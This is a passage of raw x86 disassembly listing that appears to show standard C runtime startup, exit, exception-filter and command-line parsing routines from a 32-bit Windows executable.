  422b64:	test   eax,eax
  422b66:	jge    0x422b70
  422b68:	push   0x8
  422b6a:	call   0x4229fc
  422b6f:	pop    ecx
  422b70:	call   0x42314e
  422b75:	test   eax,eax
  422b77:	jge    0x422b81
  422b79:	push   0x9
  422b7b:	call   0x4229fc
  422b80:	pop    ecx
  422b81:	call   0x422c59
  422b86:	mov    DWORD PTR [ebp-0x20],eax
  422b89:	cmp    eax,esi
  422b8b:	je     0x422b94
  422b8d:	push   eax
  422b8e:	call   0x4229fc
  422b93:	pop    ecx
  422b94:	mov    DWORD PTR [ebp-0x38],esi
  422b97:	lea    eax,[ebp-0x64]
  422b9a:	push   eax
  422b9b:	call   DWORD PTR ds:0x428064
  422ba1:	call   0x4230e5
  422ba6:	mov    DWORD PTR [ebp-0x68],eax
  422ba9:	test   BYTE PTR [ebp-0x38],0x1
  422bad:	je     0x422bb5
  422baf:	movzx  eax,WORD PTR [ebp-0x34]
  422bb3:	jmp    0x422bb8
  422bb5:	push   0xa
  422bb7:	pop    eax
  422bb8:	push   eax
  422bb9:	push   DWORD PTR [ebp-0x68]
  422bbc:	push   esi
  422bbd:	push   esi
  422bbe:	call   edi
  422bc0:	push   eax
  422bc1:	call   0x421850
  422bc6:	mov    edi,eax
  422bc8:	mov    DWORD PTR [ebp-0x6c],edi
  422bcb:	cmp    DWORD PTR [ebp-0x1c],esi
  422bce:	jne    0x422bd6
  422bd0:	push   edi
  422bd1:	call   0x422d91
  422bd6:	call   0x422db3
  422bdb:	jmp    0x422c08
  422bdd:	mov    eax,DWORD PTR [ebp-0x14]
  422be0:	mov    ecx,DWORD PTR [eax]
  422be2:	mov    ecx,DWORD PTR [ecx]
  422be4:	mov    DWORD PTR [ebp-0x70],ecx
  422be7:	push   eax
  422be8:	push   ecx
  422be9:	call   0x422f81
  422bee:	pop    ecx
  422bef:	pop    ecx
  422bf0:	ret    
  422bf1:	mov    esp,DWORD PTR [ebp-0x18]
  422bf4:	mov    edi,DWORD PTR [ebp-0x70]
  422bf7:	cmp    DWORD PTR [ebp-0x1c],0x0
  422bfb:	jne    0x422c03
  422bfd:	push   edi
  422bfe:	call   0x422da2
  422c03:	call   0x422dc2
  422c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c0c:	mov    eax,edi
  422c0e:	lea    esp,[ebp-0x7c]
  422c11:	call   0x42396f
  422c16:	ret    
  422c17:	push   0x42817c
  422c1c:	call   DWORD PTR ds:0x428018
  422c22:	test   eax,eax
  422c24:	je     0x422c3c
  422c26:	push   0x42816c
  422c2b:	push   eax
  422c2c:	call   DWORD PTR ds:0x428014
  422c32:	test   eax,eax
  422c34:	je     0x422c3c
  422c36:	push   DWORD PTR [esp+0x4]
  422c3a:	call   eax
  422c3c:	push   DWORD PTR [esp+0x4]
  422c40:	call   DWORD PTR ds:0x428070
  422c46:	int3   
  422c47:	push   0x8
  422c49:	call   0x423aef
  422c4e:	pop    ecx
  422c4f:	ret    
  422c50:	push   0x8
  422c52:	call   0x423a5b
  422c57:	pop    ecx
  422c58:	ret    
  422c59:	mov    eax,ds:0x463450
  422c5e:	test   eax,eax
  422c60:	je     0x422c64
  422c62:	call   eax
  422c64:	push   esi
  422c65:	push   edi
  422c66:	mov    ecx,0x42a00c
  422c6b:	mov    edi,0x42a018
  422c70:	xor    eax,eax
  422c72:	cmp    ecx,edi
  422c74:	mov    esi,ecx
  422c76:	jae    0x422c8f
  422c78:	test   eax,eax
  422c7a:	jne    0x422cbb
  422c7c:	mov    ecx,DWORD PTR [esi]
  422c7e:	test   ecx,ecx
  422c80:	je     0x422c84
  422c82:	call   ecx
  422c84:	add    esi,0x4
  422c87:	cmp    esi,edi
  422c89:	jb     0x422c78
  422c8b:	test   eax,eax
  422c8d:	jne    0x422cbb
  422c8f:	push   0x423787
  422c94:	call   0x423c00
  422c99:	mov    esi,0x42a000
  422c9e:	mov    eax,esi
  422ca0:	mov    edi,0x42a008
  422ca5:	cmp    eax,edi
  422ca7:	pop    ecx
  422ca8:	jae    0x422cb9
  422caa:	mov    eax,DWORD PTR [esi]
  422cac:	test   eax,eax
  422cae:	je     0x422cb2
  422cb0:	call   eax
  422cb2:	add    esi,0x4
  422cb5:	cmp    esi,edi
  422cb7:	jb     0x422caa
  422cb9:	xor    eax,eax
  422cbb:	pop    edi
  422cbc:	pop    esi
  422cbd:	ret    
  422cbe:	push   ebp
  422cbf:	mov    ebp,esp
  422cc1:	push   esi
  422cc2:	push   edi
  422cc3:	push   0x8
  422cc5:	call   0x423aef
  422cca:	xor    esi,esi
  422ccc:	inc    esi
  422ccd:	cmp    DWORD PTR ds:0x462ce4,esi
  422cd3:	pop    ecx
  422cd4:	jne    0x422ce6
  422cd6:	push   DWORD PTR [ebp+0x8]
  422cd9:	call   DWORD PTR ds:0x428078
  422cdf:	push   eax
  422ce0:	call   DWORD PTR ds:0x428074
  422ce6:	cmp    DWORD PTR [ebp+0xc],0x0
  422cea:	mov    al,BYTE PTR [ebp+0x10]
  422ced:	mov    DWORD PTR ds:0x462ce0,esi
  422cf3:	mov    ds:0x462cdc,al
  422cf8:	jne    0x422d4c
  422cfa:	mov    ecx,DWORD PTR ds:0x463448
  422d00:	test   ecx,ecx
  422d02:	je     0x422d2d
  422d04:	mov    eax,ds:0x463444
  422d09:	sub    eax,0x4
  422d0c:	cmp    eax,ecx
  422d0e:	jmp    0x422d26
  422d10:	mov    eax,DWORD PTR [eax]
  422d12:	test   eax,eax
  422d14:	je     0x422d18
  422d16:	call   eax
  422d18:	mov    eax,ds:0x463444
  422d1d:	sub    eax,0x4
  422d20:	cmp    eax,DWORD PTR ds:0x463448
  422d26:	mov    ds:0x463444,eax
  422d2b:	jae    0x422d10
  422d2d:	mov    eax,0x42a01c
  422d32:	mov    esi,0x42a020
  422d37:	cmp    eax,esi
  422d39:	mov    edi,eax
  422d3b:	jae    0x422d4c
  422d3d:	mov    eax,DWORD PTR [edi]
  422d3f:	test   eax,eax
  422d41:	je     0x422d45
  422d43:	call   eax
  422d45:	add    edi,0x4
  422d48:	cmp    edi,esi
  422d4a:	jb     0x422d3d
  422d4c:	mov    eax,0x42a024
  422d51:	mov    esi,0x42a028
  422d56:	cmp    eax,esi
  422d58:	mov    edi,eax
  422d5a:	jae    0x422d6b
  422d5c:	mov    eax,DWORD PTR [edi]
  422d5e:	test   eax,eax
  422d60:	je     0x422d64
  422d62:	call   eax
  422d64:	add    edi,0x4
  422d67:	cmp    edi,esi
  422d69:	jb     0x422d5c
  422d6b:	cmp    DWORD PTR [ebp+0x10],0x0
  422d6f:	pop    edi
  422d70:	pop    esi
  422d71:	je     0x422d7c
  422d73:	push   0x8
  422d75:	call   0x423a5b
  422d7a:	jmp    0x422d8e
  422d7c:	push   DWORD PTR [ebp+0x8]
  422d7f:	mov    DWORD PTR ds:0x462ce4,0x1
  422d89:	call   0x422c17
  422d8e:	pop    ecx
  422d8f:	pop    ebp
  422d90:	ret    
  422d91:	push   0x0
  422d93:	push   0x0
  422d95:	push   DWORD PTR [esp+0xc]
  422d99:	call   0x422cbe
  422d9e:	add    esp,0xc
  422da1:	ret    
  422da2:	push   0x0
  422da4:	push   0x1
  422da6:	push   DWORD PTR [esp+0xc]
  422daa:	call   0x422cbe
  422daf:	add    esp,0xc
  422db2:	ret    
  422db3:	push   0x1
  422db5:	push   0x0
  422db7:	push   0x0
  422db9:	call   0x422cbe
  422dbe:	add    esp,0xc
  422dc1:	ret    
  422dc2:	push   0x1
  422dc4:	push   0x1
  422dc6:	push   0x0
  422dc8:	call   0x422cbe
  422dcd:	add    esp,0xc
  422dd0:	ret    
  422dd1:	push   ebp
  422dd2:	mov    ebp,esp
  422dd4:	sub    esp,0x10c
  422dda:	mov    eax,ds:0x462600
  422ddf:	xor    eax,DWORD PTR [ebp+0x4]
  422de2:	mov    ecx,DWORD PTR [ebp+0x8]
  422de5:	push   ebx
  422de6:	push   esi
  422de7:	mov    DWORD PTR [ebp-0x4],eax
  422dea:	xor    edx,edx
  422dec:	push   edi
  422ded:	xor    eax,eax
  422def:	cmp    ecx,DWORD PTR [eax*8+0x462398]
  422df6:	je     0x422dfe
  422df8:	inc    eax
  422df9:	cmp    eax,0x12
  422dfc:	jb     0x422def
  422dfe:	mov    esi,eax
  422e00:	shl    esi,0x3
  422e03:	cmp    ecx,DWORD PTR [esi+0x462398]
  422e09:	jne    0x422f32
  422e0f:	mov    eax,ds:0x462c9c
  422e14:	cmp    eax,0x1
  422e17:	je     0x422f0d
  422e1d:	cmp    eax,edx
  422e1f:	jne    0x422e2e
  422e21:	cmp    DWORD PTR ds:0x462390,0x1
  422e28:	je     0x422f0d
  422e2e:	cmp    ecx,0xfc
  422e34:	je     0x422f32
  422e3a:	push   0x104
  422e3f:	lea    eax,[ebp-0x10c]
  422e45:	push   eax
  422e46:	push   edx
  422e47:	mov    BYTE PTR [ebp-0x8],dl
  422e4a:	call   DWORD PTR ds:0x428084
  422e50:	test   eax,eax
  422e52:	jne    0x422e67
  422e54:	lea    eax,[ebp-0x10c]
  422e5a:	push   0x4284d4
  422e5f:	push   eax
  422e60:	call   0x423d10
  422e65:	pop    ecx
  422e66:	pop    ecx
  422e67:	lea    eax,[ebp-0x10c]
  422e6d:	push   eax
  422e6e:	lea    edi,[ebp-0x10c]
  422e74:	call   0x423f40
  422e79:	inc    eax
  422e7a:	cmp    eax,0x3c
  422e7d:	pop    ecx
  422e7e:	jbe    0x422ea9
  422e80:	lea    eax,[ebp-0x10c]
  422e86:	push   eax
  422e87:	call   0x423f40
  422e8c:	mov    edi,eax
  422e8e:	lea    eax,[ebp-0x10c]
  422e94:	sub    eax,0x3b
  422e97:	push   0x3
  422e99:	add    edi,eax
  422e9b:	push   0x4284d0
  422ea0:	push   edi
  422ea1:	call   0x423e10
  422ea6:	add    esp,0x10
  422ea9:	push   edi
  422eaa:	call   0x423f40
  422eaf:	push   DWORD PTR [esi+0x46239c]
  422eb5:	mov    ebx,eax
  422eb7:	call   0x423f40
  422ebc:	lea    eax,[ebx+eax*1+0x1c]
  422ec0:	pop    ecx
  422ec1:	add    eax,0x3
  422ec4:	pop    ecx
  422ec5:	and    eax,0xfffffffc
  422ec8:	call   0x423980
  422ecd:	mov    ebx,esp
  422ecf:	push   0x4284b4
  422ed4:	push   ebx
  422ed5:	call   0x423d10
  422eda:	push   edi
  422edb:	push   ebx
  422edc:	call   0x423d20
  422ee1:	push   0x4284b0
  422ee6:	push   ebx
  422ee7:	call   0x423d20
  422eec:	push   DWORD PTR [esi+0x46239c]
  422ef2:	push   ebx
  422ef3:	call   0x423d20
  422ef8:	push   0x12010
  422efd:	push   0x428488
  422f02:	push   ebx
  422f03:	call   0x423c12
  422f08:	add    esp,0x2c
  422f0b:	jmp    0x422f32
  422f0d:	push   edx
  422f0e:	lea    eax,[ebp+0x8]
  422f11:	push   eax
  422f12:	lea    esi,[esi+0x46239c]
  422f18:	push   DWORD PTR [esi]
  422f1a:	call   0x423f40
  422f1f:	pop    ecx
  422f20:	push   eax
  422f21:	push   DWORD PTR [esi]
  422f23:	push   0xfffffff4
  422f25:	call   DWORD PTR ds:0x428080
  422f2b:	push   eax
  422f2c:	call   DWORD PTR ds:0x42807c
  422f32:	lea    esp,[ebp-0x118]
  422f38:	mov    ecx,DWORD PTR [ebp-0x4]
  422f3b:	xor    ecx,DWORD PTR [ebp+0x4]
  422f3e:	call   0x423ffc
  422f43:	pop    edi
  422f44:	pop    esi
  422f45:	pop    ebx
  422f46:	leave  
  422f47:	ret    
  422f48:	mov    eax,ds:0x462c9c
  422f4d:	cmp    eax,0x1
  422f50:	je     0x422f5f
  422f52:	test   eax,eax
  422f54:	jne    0x422f80
  422f56:	cmp    DWORD PTR ds:0x462390,0x1
  422f5d:	jne    0x422f80
  422f5f:	push   0xfc
  422f64:	call   0x422dd1
  422f69:	mov    eax,ds:0x462ce8
  422f6e:	test   eax,eax
  422f70:	pop    ecx
  422f71:	je     0x422f75
  422f73:	call   eax
  422f75:	push   0xff
  422f7a:	call   0x422dd1
  422f7f:	pop    ecx
  422f80:	ret    
  422f81:	push   ebp
  422f82:	mov    ebp,esp
  422f84:	push   ecx
  422f85:	push   ebx
  422f86:	push   esi
  422f87:	push   edi
  422f88:	call   0x4237e9
  422f8d:	mov    edi,DWORD PTR [ebp+0x8]
  422f90:	mov    esi,eax
  422f92:	mov    edx,DWORD PTR [esi+0x54]
  422f95:	mov    eax,ds:0x4624ac
  422f9a:	mov    ecx,edx
  422f9c:	cmp    DWORD PTR [ecx],edi
  422f9e:	je     0x422fad
  422fa0:	lea    ebx,[eax+eax*2]
  422fa3:	add    ecx,0xc
  422fa6:	lea    ebx,[edx+ebx*4]
  422fa9:	cmp    ecx,ebx
  422fab:	jb     0x422f9c
  422fad:	lea    eax,[eax+eax*2]
  422fb0:	lea    eax,[edx+eax*4]
  422fb3:	cmp    ecx,eax
  422fb5:	jae    0x422fbb
  422fb7:	cmp    DWORD PTR [ecx],edi
  422fb9:	je     0x422fbd
  422fbb:	xor    ecx,ecx
  422fbd:	test   ecx,ecx
  422fbf:	je     0x4230d7
  422fc5:	mov    ebx,DWORD PTR [ecx+0x8]
  422fc8:	test   ebx,ebx
  422fca:	mov    DWORD PTR [ebp+0x8],ebx
  422fcd:	je     0x4230d7
  422fd3:	cmp    ebx,0x5
  422fd6:	jne    0x422fe4
  422fd8:	and    DWORD PTR [ecx+0x8],0x0
  422fdc:	xor    eax,eax
  422fde:	inc    eax
  422fdf:	jmp    0x4230e0
  422fe4:	cmp    ebx,0x1
  422fe7:	je     0x4230d2
  422fed:	mov    eax,DWORD PTR [esi+0x58]
  422ff0:	mov    DWORD PTR [ebp-0x4],eax
  422ff3:	mov    eax,DWORD PTR [ebp+0xc]
  422ff6:	mov    DWORD PTR [esi+0x58],eax
  422ff9:	mov    eax,DWORD PTR [ecx+0x4]
  422ffc:	cmp    eax,0x8
  422fff:	jne    0x4230c4
  423005:	mov    edx,DWORD PTR ds:0x4624a0
  42300b:	mov    eax,ds:0x4624a4
  423010:	add    eax,edx
  423012:	cmp    edx,eax
  423014:	jge    0x42303d
  423016:	lea    eax,[edx+edx*2]
  423019:	shl    eax,0x2
  42301c:	mov    edi,DWORD PTR [esi+0x54]
  42301f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  423024:	mov    edi,DWORD PTR ds:0x4624a0
  42302a:	mov    ebx,DWORD PTR ds:0x4624a4
  423030:	inc    edx
  423031:	add    ebx,edi
  423033:	add    eax,0xc
  423036:	cmp    edx,ebx
  423038:	jl     0x42301c
  42303a:	mov    ebx,DWORD PTR [ebp+0x8]
  42303d:	mov    ecx,DWORD PTR [ecx]
  42303f:	cmp    ecx,0xc000008e
  423045:	mov    edi,DWORD PTR [esi+0x5c]
  423048:	jne    0x423053
  42304a:	mov    DWORD PTR [esi+0x5c],0x83
  423051:	jmp    0x4230b7
  423053:	cmp    ecx,0xc0000090
  423059:	jne    0x423064
  42305b:	mov    DWORD PTR [esi+0x5c],0x81
  423062:	jmp    0x4230b7
  423064:	cmp    ecx,0xc0000091
  42306a:	jne    0x423075
  42306c:	mov    DWORD PTR [esi+0x5c],0x84
  423073:	jmp    0x4230b7
  423075:	cmp    ecx,0xc0000093
  42307b:	jne    0x423086
  42307d:	mov    DWORD PTR [esi+0x5c],0x85
  423084:	jmp    0x4230b7
  423086:	cmp    ecx,0xc000008d
  42308c:	jne    0x423097
  42308e:	mov    DWORD PTR [esi+0x5c],0x82
  423095:	jmp    0x4230b7
  423097:	cmp    ecx,0xc000008f
  42309d:	jne    0x4230a8
  42309f:	mov    DWORD PTR [esi+0x5c],0x86
  4230a6:	jmp    0x4230b7
  4230a8:	cmp    ecx,0xc0000092
  4230ae:	jne    0x4230b7
  4230b0:	mov    DWORD PTR [esi+0x5c],0x8a
  4230b7:	push   DWORD PTR [esi+0x5c]
  4230ba:	push   0x8
  4230bc:	call   ebx
  4230be:	pop    ecx
  4230bf:	mov    DWORD PTR [esi+0x5c],edi
  4230c2:	jmp    0x4230cb
  4230c4:	and    DWORD PTR [ecx+0x8],0x0
  4230c8:	push   eax
  4230c9:	call   ebx
  4230cb:	mov    eax,DWORD PTR [ebp-0x4]
  4230ce:	pop    ecx
  4230cf:	mov    DWORD PTR [esi+0x58],eax
  4230d2:	or     eax,0xffffffff
  4230d5:	jmp    0x4230e0
  4230d7:	push   DWORD PTR [ebp+0xc]
  4230da:	call   DWORD PTR ds:0x428088
  4230e0:	pop    edi
  4230e1:	pop    esi
  4230e2:	pop    ebx
  4230e3:	leave  
  4230e4:	ret    
  4230e5:	cmp    DWORD PTR ds:0x46344c,0x0
  4230ec:	jne    0x4230f3
  4230ee:	call   0x42451c
  4230f3:	push   esi
  4230f4:	mov    esi,DWORD PTR ds:0x463454
  4230fa:	test   esi,esi
  4230fc:	jne    0x423105
  4230fe:	mov    esi,0x4284eb
  423103:	jmp    0x42314a
  423105:	mov    al,BYTE PTR [esi]
  423107:	cmp    al,0x22
  423109:	jne    0x423133
  42310b:	inc    esi
  42310c:	mov    al,BYTE PTR [esi]
  42310e:	cmp    al,0x22
  423110:	je     0x423143
  423112:	test   al,al
  423114:	je     0x42312c
  423116:	movzx  eax,al
  423119:	push   eax
  42311a:	call   0x42403b
  42311f:	test   eax,eax
  423121:	pop    ecx
  423122:	je     0x423125
  423124:	inc    esi
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	jne    0x423112
  42312c:	cmp    BYTE PTR [esi],0x22
  42312f:	jne    0x423144
  423131:	jmp    0x423143
  423133:	cmp    al,0x20
  423135:	jbe    0x423144
  423137:	inc    esi
  423138:	cmp    BYTE PTR [esi],0x20
  42313b:	ja     0x423137
  42313d:	jmp    0x423144
  42313f:	cmp    al,0x20
  423141:	ja     0x42314a
  423143:	inc    esi
  423144:	mov    al,BYTE PTR [esi]
  423146:	test   al,al
  423148:	jne    0x42313f
  42314a:	mov    eax,esi
  42314c:	pop    esi
  42314d:	ret    
  42314e:	push   ebx
  42314f:	xor    ebx,ebx
  423151:	cmp    DWORD PTR ds:0x46344c,ebx
  423157:	push   esi
  423158:	push   edi
  423159:	jne    0x423160
  42315b:	call   0x42451c
  423160:	mov    esi,DWORD PTR ds:0x462c94
  423166:	xor    edi,edi
  423168:	cmp    esi,ebx
  42316a:	jne    0x42317e
  42316c:	jmp    0x42319e
  42316e:	cmp    al,0x3d
  423170:	je     0x423173
  423172:	inc    edi
  423173:	push   esi
  423174:	call   0x423f40
  423179:	pop    ecx
  42317a:	lea    esi,[esi+eax*1+0x1]
  42317e:	mov    al,BYTE PTR [esi]
  423180:	cmp    al,bl
  423182:	jne    0x42316e
  423184:	lea    eax,[edi*4+0x4]
  42318b:	push   eax
  42318c:	call   0x424652
  423191:	mov    edi,eax
  423193:	cmp    edi,ebx
  423195:	pop    ecx
  423196:	mov    DWORD PTR ds:0x462cc4,edi
  42319c:	jne    0x4231a3
  42319e:	or     eax,0xffffffff
  4231a1:	jmp    0x4231fb
  4231a3:	mov    esi,DWORD PTR ds:0x462c94
  4231a9:	push   ebp
  4231aa:	jmp    0x4231d6
  4231ac:	push   esi
  4231ad:	call   0x423f40
  4231b2:	mov    ebp,eax
  4231b4:	inc    ebp
  4231b5:	cmp    BYTE PTR [esi],0x3d
  4231b8:	pop    ecx
  4231b9:	je     0x4231d4
  4231bb:	push   ebp
  4231bc:	call   0x424652
  4231c1:	cmp    eax,ebx
  4231c3:	pop    ecx
  4231c4:	mov    DWORD PTR [edi],eax
  4231c6:	je     0x4231ff
  4231c8:	push   esi
  4231c9:	push   eax
  4231ca:	call   0x423d10
  4231cf:	pop    ecx
  4231d0:	pop    ecx
  4231d1:	add    edi,0x4
  4231d4:	add    esi,ebp
  4231d6:	cmp    BYTE PTR [esi],bl
  4231d8:	jne    0x4231ac
  4231da:	push   DWORD PTR ds:0x462c94
  4231e0:	call   0x42453a
  4231e5:	mov    DWORD PTR ds:0x462c94,ebx
  4231eb:	mov    DWORD PTR [edi],ebx
  4231ed:	mov    DWORD PTR ds:0x463440,0x1
  4231f7:	xor    eax,eax
  4231f9:	pop    ecx
  4231fa:	pop    ebp
  4231fb:	pop    edi
  4231fc:	pop    esi
  4231fd:	pop    ebx
  4231fe:	ret    
  4231ff:	push   DWORD PTR ds:0x462cc4
  423205:	call   0x42453a
  42320a:	mov    DWORD PTR ds:0x462cc4,ebx
  423210:	or     eax,0xffffffff
  423213:	jmp    0x4231f9
  423215:	push   ebp
  423216:	mov    ebp,esp
  423218:	push   ecx
  423219:	push   ebx
  42321a:	mov    ebx,DWORD PTR [ebp+0xc]
  42321d:	xor    edx,edx
  42321f:	cmp    DWORD PTR [ebp+0x8],edx
  423222:	push   edi
  423223:	mov    DWORD PTR [esi],edx
  423225:	mov    edi,ecx
  423227:	mov    DWORD PTR [ebx],0x1
  42322d:	je     0x423238
  42322f:	mov    ecx,DWORD PTR [ebp+0x8]
  423232:	add    DWORD PTR [ebp+0x8],0x4
  423236:	mov    DWORD PTR [ecx],edi
  423238:	cmp    BYTE PTR [eax],0x22
  42323b:	jne    0x42324b
  42323d:	xor    ecx,ecx
  42323f:	test   edx,edx
  423241:	sete   cl
  423244:	inc    eax
  423245:	mov    edx,ecx
  423247:	mov    cl,0x22
  423249:	jmp    0x423278
  42324b:	inc    DWORD PTR [esi]
  42324d:	test   edi,edi
  42324f:	je     0x423256
  423251:	mov    cl,BYTE PTR [eax]
  423253:	mov    BYTE PTR [edi],cl
  423255:	inc    edi
  423256:	mov    cl,BYTE PTR [eax]
  423258:	movzx  ebx,cl
  42325b:	inc    eax
  42325c:	test   BYTE PTR [ebx+0x463101],0x4
  423263:	je     0x423271
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    bl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],bl
  42326f:	inc    edi
  423270:	inc    eax
  423271:	test   cl,cl
  423273:	mov    ebx,DWORD PTR [ebp+0xc]
  423276:	je     0x4232aa
  423278:	test   edx,edx
  42327a:	jne    0x423238
  42327c:	cmp    cl,0x20
  42327f:	je     0x423286
  423281:	cmp    cl,0x9
  423284:	jne    0x423238
  423286:	test   edi,edi
  423288:	je     0x42328e
  42328a:	and    BYTE PTR [edi-0x1],0x0
  42328e:	and    DWORD PTR [ebp-0x4],0x0
  423292:	cmp    BYTE PTR [eax],0x0
  423295:	je     0x423371
  42329b:	mov    cl,BYTE PTR [eax]
  42329d:	cmp    cl,0x20
  4232a0:	je     0x4232a7
  4232a2:	cmp    cl,0x9
  4232a5:	jne    0x4232ad
  4232a7:	inc    eax
  4232a8:	jmp    0x42329b
  4232aa:	dec    eax
  4232ab:	jmp    0x42328e
  4232ad:	cmp    BYTE PTR [eax],0x0
  4232b0:	je     0x423371
  4232b6:	cmp    DWORD PTR [ebp+0x8],0x0
  4232ba:	je     0x4232c5
  4232bc:	mov    ecx,DWORD PTR [ebp+0x8]
  4232bf:	add    DWORD PTR [ebp+0x8],0x4
  4232c3:	mov    DWORD PTR [ecx],edi
  4232c5:	inc    DWORD PTR [ebx]
  4232c7:	xor    ebx,ebx
  4232c9:	inc    ebx
  4232ca:	xor    edx,edx
  4232cc:	jmp    0x4232d0
  4232ce:	inc    eax
  4232cf:	inc    edx
  4232d0:	cmp    BYTE PTR [eax],0x5c
  4232d3:	je     0x4232ce
  4232d5:	cmp    BYTE PTR [eax],0x22
  4232d8:	jne    0x423300
  4232da:	test   dl,0x1
  4232dd:	jne    0x4232fe
  4232df:	cmp    DWORD PTR [ebp-0x4],0x0
  4232e3:	je     0x4232f1
  4232e5:	lea    ecx,[eax+0x1]
  4232e8:	cmp    BYTE PTR [ecx],0x22
  4232eb:	jne    0x4232f1
  4232ed:	mov    eax,ecx
  4232ef:	jmp    0x4232f3
  4232f1:	xor    ebx,ebx
  4232f3:	xor    ecx,ecx
  4232f5:	cmp    DWORD PTR [ebp-0x4],ecx
  4232f8:	sete   cl
  4232fb:	mov    DWORD PTR [ebp-0x4],ecx
  4232fe:	shr    edx,1
  423300:	test   edx,edx
  423302:	je     0x423311
  423304:	test   edi,edi
  423306:	je     0x42330c
  423308:	mov    BYTE PTR [edi],0x5c
  42330b:	inc    edi
  42330c:	inc    DWORD PTR [esi]
  42330e:	dec    edx
  42330f:	jne    0x423304
  423311:	mov    cl,BYTE PTR [eax]
  423313:	test   cl,cl
  423315:	je     0x42335f
  423317:	cmp    DWORD PTR [ebp-0x4],0x0
  42331b:	jne    0x423327
  42331d:	cmp    cl,0x20
  423320:	je     0x42335f
  423322:	cmp    cl,0x9
  423325:	je     0x42335f
  423327:	test   ebx,ebx
  423329:	je     0x423359
  42332b:	test   edi,edi
  42332d:	je     0x423348
  42332f:	movzx  edx,cl
  423332:	test   BYTE PTR [edx+0x463101],0x4
  423339:	je     0x423341
  42333b:	mov    BYTE PTR [edi],cl
  42333d:	inc    edi
  42333e:	inc    eax
  42333f:	inc    DWORD PTR [esi]
  423341:	mov    cl,BYTE PTR [eax]
  423343:	mov    BYTE PTR [edi],cl
  423345:	inc    edi
  423346:	jmp    0x423357
  423348:	movzx  ecx,cl
  42334b:	test   BYTE PTR [ecx+0x463101],0x4
  423352:	je     0x423357
  423354:	inc    eax
  423355:	inc    DWORD PTR [esi]
  423357:	inc    DWORD PTR [esi]
  423359:	inc    eax
  42335a:	jmp    0x4232c7
  42335f:	test   edi,edi
  423361:	je     0x423367
  423363:	and    BYTE PTR [edi],0x0
  423366:	inc    edi
  423367:	inc    DWORD PTR [esi]
  423369:	mov    ebx,DWORD PTR [ebp+0xc]
  42336c:	jmp    0x423292
  423371:	mov    eax,DWORD PTR [ebp+0x8]
  423374:	test   eax,eax
  423376:	je     0x42337b
  423378:	and    DWORD PTR [eax],0x0
  42337b:	inc    DWORD PTR [ebx]
  42337d:	pop    edi
  42337e:	pop    ebx
  42337f:	leave  
  423380:	ret    
  423381:	push   ebp
  423382:	mov    ebp,esp
  423384:	push   ecx
  423385:	push   ecx
  423386:	push   ebx
  423387:	push   esi
  423388:	push   edi
  423389:	xor    edi,edi
  42338b:	cmp    DWORD PTR ds:0x46344c,edi
  423391:	jne    0x423398
  423393:	call   0x42451c
  423398:	and    BYTE PTR ds:0x462df4,0x0
  42339f:	push   0x104
  4233a4:	mov    esi,0x462cf0
  4233a9:	push   esi
  4233aa:	push   edi
  4233ab:	call   DWORD PTR ds:0x428084
  4233b1:	mov    eax,ds:0x463454
  4233b6:	cmp    eax,edi
  4233b8:	mov    DWORD PTR ds:0x462cd4,esi
  4233be:	je     0x4233c7
  4233c0:	cmp    BYTE PTR [eax],0x0
  4233c3:	mov    ebx,eax
  4233c5:	jne    0x4233c9
  4233c7:	mov    ebx,esi
  4233c9:	lea    eax,[ebp-0x4]
  4233cc:	push   eax
  4233cd:	push   edi
  4233ce:	lea    esi,[ebp-0x8]
  4233d1:	xor    ecx,ecx
  4233d3:	mov    eax,ebx
  4233d5:	call   0x423215
  4233da:	mov    esi,DWORD PTR [ebp-0x4]
  4233dd:	mov    eax,DWORD PTR [ebp-0x8]
  4233e0:	shl    esi,0x2
  4233e3:	add    eax,esi
  4233e5:	push   eax
  4233e6:	call   0x424652
  4233eb:	mov    edi,eax
  4233ed:	add    esp,0xc
  4233f0:	test   edi,edi
  4233f2:	jne    0x4233f9
  4233f4:	or     eax,0xffffffff
  4233f7:	jmp    0x42341e
  4233f9:	lea    eax,[ebp-0x4]
  4233fc:	push   eax
  4233fd:	lea    ecx,[esi+edi*1]
  423400:	push   edi
  423401:	lea    esi,[ebp-0x8]
  423404:	mov    eax,ebx
  423406:	call   0x423215
  42340b:	mov    eax,DWORD PTR [ebp-0x4]
  42340e:	dec    eax
  42340f:	pop    ecx
  423410:	mov    ds:0x462cb8,eax
  423415:	pop    ecx
  423416:	mov    DWORD PTR ds:0x462cbc,edi
  42341c:	xor    eax,eax
  42341e:	pop    edi
  42341f:	pop    esi
  423420:	pop    ebx
  423421:	leave  
  423422:	ret    
  423423:	push   ecx
  423424:	push   ecx
  423425:	mov    eax,ds:0x462df8
  42342a:	push   ebx
  42342b:	push   ebp
  42342c:	push   esi
  42342d:	push   edi
  42342e:	mov    edi,DWORD PTR ds:0x428098
  423434:	xor    ebx,ebx
  423436:	xor    esi,esi
  423438:	cmp    eax,ebx
  42343a:	push   0x2
  42343c:	pop    ebp
  42343d:	jne    0x42346c
  42343f:	call   edi
  423441:	mov    esi,eax
  423443:	cmp    esi,ebx
  423445:	je     0x423453
  423447:	mov    DWORD PTR ds:0x462df8,0x1
  423451:	jmp    0x423471
  423453:	call   DWORD PTR ds:0x42801c
  423459:	cmp    eax,0x78
  42345c:	jne    0x423467
  42345e:	mov    eax,ebp
  423460:	mov    ds:0x462df8,eax
  423465:	jmp    0x42346c
  423467:	mov    eax,ds:0x462df8
  42346c:	cmp    eax,0x1
  42346f:	jne    0x4234ee
  423471:	cmp    esi,ebx
  423473:	jne    0x42347d
  423475:	call   edi
  423477:	mov    esi,eax
  423479:	cmp    esi,ebx
  42347b:	je     0x4234f6
  42347d:	cmp    WORD PTR [esi],bx
  423480:	mov    eax,esi
  423482:	je     0x423492
  423484:	add    eax,ebp
  423486:	cmp    WORD PTR [eax],bx
  423489:	jne    0x423484
  42348b:	add    eax,ebp
  42348d:	cmp    WORD PTR [eax],bx
  423490:	jne    0x423484
  423492:	mov    edi,DWORD PTR ds:0x428094
  423498:	push   ebx
  423499:	push   ebx
  42349a:	push   ebx
  42349b:	sub    eax,esi
  42349d:	push   ebx
  42349e:	sar    eax,1
  4234a0:	inc    eax
  4234a1:	push   eax
  4234a2:	push   esi
  4234a3:	push   ebx
  4234a4:	push   ebx
